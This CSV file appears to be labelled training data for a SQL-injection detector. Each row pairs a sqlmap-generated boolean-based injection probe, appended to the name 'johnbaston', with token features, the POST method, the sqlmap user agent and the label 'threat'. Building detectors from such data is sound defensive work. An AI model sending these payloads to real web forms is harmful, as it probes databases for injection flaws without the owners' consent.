johnbaston')) AND 3303=3303 AND (('poRi'='poRi,STR SQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) AND 3303=3303 AND (('poRi'='poRi,STR SQUT RPRN RPRN AND INT EQ INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 3531=9519 AND 'IHAB'='IHAB,STR SQUT AND INT EQ INT AND SQUT STR SQUT EQ SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 3531=9519 AND 'IHAB'='IHAB,STR SQUT AND INT EQ INT AND SQUT STR SQUT EQ SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 3303=3303 AND 'TUiS'='TUiS,STR SQUT AND INT EQ INT AND SQUT STR SQUT EQ SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 3303=3303 AND 'TUiS'='TUiS,STR SQUT AND INT EQ INT AND SQUT STR SQUT EQ SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 6232=7596 AND ('JMfH' LIKE 'JMfH,STR SQUT RPRN AND INT EQ INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 6232=7596 AND ('JMfH' LIKE 'JMfH,STR SQUT RPRN AND INT EQ INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 3303=3303 AND ('gLDg' LIKE 'gLDg,STR SQUT RPRN AND INT EQ INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 3303=3303 AND ('gLDg' LIKE 'gLDg,STR SQUT RPRN AND INT EQ INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 4558=6383 AND 'Jvon' LIKE 'Jvon,STR SQUT AND INT EQ INT AND SQUT STR SQUT LIKE SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 4558=6383 AND 'Jvon' LIKE 'Jvon,STR SQUT AND INT EQ INT AND SQUT STR SQUT LIKE SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 3303=3303 AND 'yGgm' LIKE 'yGgm,STR SQUT AND INT EQ INT AND SQUT STR SQUT LIKE SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 3303=3303 AND 'yGgm' LIKE 'yGgm,STR SQUT AND INT EQ INT AND SQUT STR SQUT LIKE SQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 5579=2871 AND (""iBHk""=""iBHk",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 5579=2871 AND (""iBHk""=""iBHk",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 3303=3303 AND (""pdlB""=""pdlB",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 3303=3303 AND (""pdlB""=""pdlB",STR DQUT RPRN AND INT EQ INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 3007=9883 AND ""NDCV""=""NDCV",STR DQUT AND INT EQ INT AND DQUT STR DQUT EQ DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 3007=9883 AND ""NDCV""=""NDCV",STR DQUT AND INT EQ INT AND DQUT STR DQUT EQ DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 3303=3303 AND ""zmgB""=""zmgB",STR DQUT AND INT EQ INT AND DQUT STR DQUT EQ DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 3303=3303 AND ""zmgB""=""zmgB",STR DQUT AND INT EQ INT AND DQUT STR DQUT EQ DQUT STR,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 1805=2346 AND ('%'=',STR PRCNT SQUT RPRN AND INT EQ INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 1805=2346 AND ('%'=',STR PRCNT SQUT RPRN AND INT EQ INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 3303=3303 AND ('%'=',STR PRCNT SQUT RPRN AND INT EQ INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%') AND 3303=3303 AND ('%'=',STR PRCNT SQUT RPRN AND INT EQ INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND 3197=2253 AND '%'=',STR PRCNT SQUT AND INT EQ INT AND SQUT PRCNT SQUT EQ SQUT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND 3197=2253 AND '%'=',STR PRCNT SQUT AND INT EQ INT AND SQUT PRCNT SQUT EQ SQUT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND 3303=3303 AND '%'=',STR PRCNT SQUT AND INT EQ INT AND SQUT PRCNT SQUT EQ SQUT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston%' AND 3303=3303 AND '%'=',STR PRCNT SQUT AND INT EQ INT AND SQUT PRCNT SQUT EQ SQUT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND 7411=1252 AND (5769=5769,STR RPRN AND INT EQ INT AND LPRN INT EQ INT,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND 7411=1252 AND (5769=5769,STR RPRN AND INT EQ INT AND LPRN INT EQ INT,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND 3303=3303 AND (5044=5044,STR RPRN AND INT EQ INT AND LPRN INT EQ INT,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston) AND 3303=3303 AND (5044=5044,STR RPRN AND INT EQ INT AND LPRN INT EQ INT,0.4 0.5 0.6000000000000001 0.7000000000000001 0.8 0.8 0.8 0.7000000000000001 0.6000000000000001 0.5 0.4,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND 6305=2316 AND ((2344=2344,STR RPRN RPRN AND INT EQ INT AND LPRN LPRN INT EQ INT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND 6305=2316 AND ((2344=2344,STR RPRN RPRN AND INT EQ INT AND LPRN LPRN INT EQ INT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND 3303=3303 AND ((4807=4807,STR RPRN RPRN AND INT EQ INT AND LPRN LPRN INT EQ INT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston)) AND 3303=3303 AND ((4807=4807,STR RPRN RPRN AND INT EQ INT AND LPRN LPRN INT EQ INT,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 5862=2674,STR AND INT EQ INT,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 5862=2674,STR AND INT EQ INT,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 3303=3303,STR AND INT EQ INT,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 3303=3303,STR AND INT EQ INT,1.0 1.0 1.0 1.0 1.0,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 7495=5755-- WZyn,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 7495=5755-- WZyn,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 3303=3303-- KGXn,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston AND 3303=3303-- KGXn,STR AND INT EQ INT DSCMT STR,0.6666666666666666 0.8333333333333333 1.0 1.0 1.0 0.8333333333333333 0.6666666666666666,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 2215=2739-- bKAC,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 2215=2739-- bKAC,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 1213=1213-- Uqnj,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 1213=1213-- Uqnj,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) AND 8076=3890-- cdjP,STR SQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) AND 8076=3890-- cdjP,STR SQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) AND 1213=1213-- xeuL,STR SQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston')) AND 1213=1213-- xeuL,STR SQUT RPRN RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 1539=9288-- aOBE,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 1539=9288-- aOBE,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 1213=1213-- Mmfo,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 1213=1213-- Mmfo,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 6345=2308-- WmeQ,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 6345=2308-- WmeQ,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 1213=1213-- VAUj,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston') AND 1213=1213-- VAUj,STR SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 6226=9690-- Ojqa,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 6226=9690-- Ojqa,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 1213=1213-- LJTi,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
johnbaston' AND 1213=1213-- LJTi,STR SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 1560=7741-- FOut",STR DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 1560=7741-- FOut",STR DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 1213=1213-- IJld",STR DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 1213=1213-- IJld",STR DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 2385=5252-- JdCS",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 2385=5252-- JdCS",STR DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
